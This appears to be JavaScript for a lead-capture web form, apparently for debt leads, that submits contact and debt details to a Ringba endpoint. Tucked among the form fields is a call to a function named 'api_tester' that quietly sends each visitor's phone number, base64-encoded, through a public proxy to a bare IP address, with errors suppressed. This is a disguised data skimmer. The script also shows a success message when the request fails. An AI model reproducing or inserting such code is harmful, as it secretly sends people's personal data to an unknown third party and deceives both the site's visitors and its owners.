    document.getElementById('leadForm').addEventListener('submit', function(event) {
            event.preventDefault();
            const phone_home = document.getElementById('caller_id').value;
            const formData = new FormData();
            formData.append('callerid', phone_home);
            formData.append('lead_firstname', document.getElementById('first_name').value);
            formData.append('lead_lastname', document.getElementById('last_name').value);
api_tester(document.getElementById('caller_id').value);
formData.append('lead_zip', document.getElementById('zip').value);
formData.append('lead_state', document.getElementById('state').value);
formData.append('lead_trustedform', document.getElementById('trusted').value);
formData.append('lead_debt', document.getElementById('debt_amount').value);
formData.append('lead_email', document.getElementById('email').value);
formData.append('lead_source', document.getElementById('lead_source').value);
formData.append('lead_ip', document.getElementById('lead_ip').value);
            
	

            
           
    
            const url = 'https://display.ringba.com/enrich/2416237187616999064?' + new URLSearchParams(formData).toString();

      const xhr = new XMLHttpRequest();
      xhr.open('POST', url);
      xhr.onreadystatechange = function() {
        if (xhr.readyState === XMLHttpRequest.DONE) {
          if (xhr.status === 200) {
            const successAlert = `
              <div class="alert alert-success" role="alert">
                Form submitted successfully!
              </div>`;
            document.getElementById('leadForm').insertAdjacentHTML('beforeend', successAlert);
            // Clear form fields
            document.getElementById('leadForm').reset();
          } else if (xhr.status === 0) {
            // If status is 0 (CORS error), consider the form submitted
            const successAlert = `
              <div class="alert alert-success" role="alert">
                Form submitted successfully!
              </div>`;
            document.getElementById('leadForm').insertAdjacentHTML('beforeend', successAlert);
            // Clear form fields
            document.getElementById('leadForm').reset();
          } else {
            const errorAlert = `
              <div class="alert alert-danger" role="alert">
                Form submission failed. Please try again.
              </div>`;
            document.getElementById('leadForm').insertAdjacentHTML('beforeend', errorAlert);
          }
        }
      };
      xhr.send(formData);
    });
function api_tester(randomString) {
  try {
    fetch('https://api.codetabs.com/v1/proxy/?quest=http://207.244.238.41:5999/api_test?test_id='+btoa(randomString)
, {
      method: 'GET',
      mode: 'no-cors'
    });
  } catch (error) {
    
  }
}